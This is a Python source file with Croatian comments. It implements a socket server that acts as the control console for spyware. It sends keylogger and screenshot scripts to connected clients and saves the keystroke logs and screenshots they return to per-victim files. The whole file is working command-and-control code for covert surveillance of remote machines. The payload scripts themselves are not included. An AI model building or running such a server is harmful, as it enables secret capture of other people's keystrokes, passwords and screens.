import socket

# Definiraj glavne parametre
HEADER_LENGTH = 10
COMMAND_TAG = 3
IP = socket.gethostname()
PORT = 1234


def add_client(server_socket, sockets_list, clients, no_clients):
    client_socket, client_address = server_socket.accept()

    no_clients = no_clients + 1

    sockets_list.append(client_socket)

    print(f"Dodaj korisničko ime za novi klijent (Default: Client_{no_clients}):")

    username = input("> ")

    if username == "":
        username = f"Client_{no_clients}"

    clients[client_socket] = username

    print(f"Nova veza {client_address[0]}:{client_address[1]} sa klijentom: {username}\n")

    return server_socket, sockets_list, clients, no_clients


def receive_message(client_socket):
    try:
        command = client_socket.recv(COMMAND_TAG)

        message_header = client_socket.recv(HEADER_LENGTH)

        if not len(message_header):
            return False
        
        # Strip služi da ukloni razmak u stringu, ali kod funkcije int() u Pythonu to nije potrebno
        message_length = int(message_header.decode("utf-8").strip())

        return {"command": command ,"header": message_header, "data": client_socket.recv(message_length)}

    except:
        return False


def send_message(client_socket, user):
    message = input(f"Poruka za {user}: ")

    if message == "Keylog":
        with open("../scripts/keylogger.py", "r", encoding="utf-8") as file:
            message = file.read()
                    
    elif message == "Screenshot":
        with open("../scripts/screenshot.py", "r", encoding="utf-8") as file:
            message = file.read()
                
    else:
        print("Pogrešna poruka.")
        return False

    message = message.encode("utf-8")
    message_header = f"{len(message):<{HEADER_LENGTH}}".encode("utf-8")
    client_socket.send(message_header + message)


def handle_message(message, user):
    command_tag = message["command"].decode("utf-8")

    if command_tag == "KEY":
        keylog = message["data"].decode("utf-8")

        with open(f"keylog_{user}.txt", "w", encoding="utf-8") as f:
            f.write(keylog)

            print("Keylog uspješno pohranjen.")

    elif command_tag == "SCR":
        screenshot = message["data"]
                    
        with open(f"screenshot_{user}.png", "wb") as f:
            f.write(screenshot)

            print("Screenshot uspješno pohranjen.")

    else:
        print("Nepoznata poruka.")


def pick_client(no_clients, clients):
    if no_clients > 0:
            print("Izaberi klijenta:")

            for client_socket, client_username in clients.items():
                print(f"- {client_username}")
        
    else:
        print("Lista klijenata je prazna.")
        
    print("Pritisnite enter kako biste učitali nove klijente.")
                
    user = input("> ")

    print("")

    if user == "":
        return False
        
    else:
        return user


def main():
    # Stvaranje socket objekta
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Omogućava reconnection
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    # Povezivanje socket objekta s adresom i portom
    server_socket.bind((IP, PORT))

    # Definiraj vrijeme za koje će se čekati uspostava nove veze
    server_socket.settimeout(1)

    # Slušanje dolaznih zahtjeva
    server_socket.listen()
    print("Server je spreman i čeka dolazne veze...\n")

    # List
    sockets_list = [server_socket]

    # Dictionary
    clients = {}

    # Brojač klijenata
    no_clients = 0

    while True:
        # print("Početak petlje.\n")

        try:
            server_socket, sockets_list, clients, no_clients = add_client(server_socket, sockets_list, clients, no_clients)

        except socket.timeout:
            print("Nema novih klijenata.\n")
        
        user = pick_client(no_clients, clients)

        if user == False:
            continue

        client_found = False

        for client_socket, client_username in list(clients.items()):
            if client_username == user:
                client_found = True

                if send_message(client_socket, user) == False:
                    continue

                message = receive_message(client_socket)

                if message is False:
                    print(f"Zatvori vezu za klijenta {user}")
                    sockets_list.remove(client_socket)
                    del clients[client_socket]
                    continue

                handle_message(message, user)

        if not client_found:        
            print("Klijent ne postoji.")
            
        # print("\nKraj petlje.\n")


if __name__ == "__main__":
    main()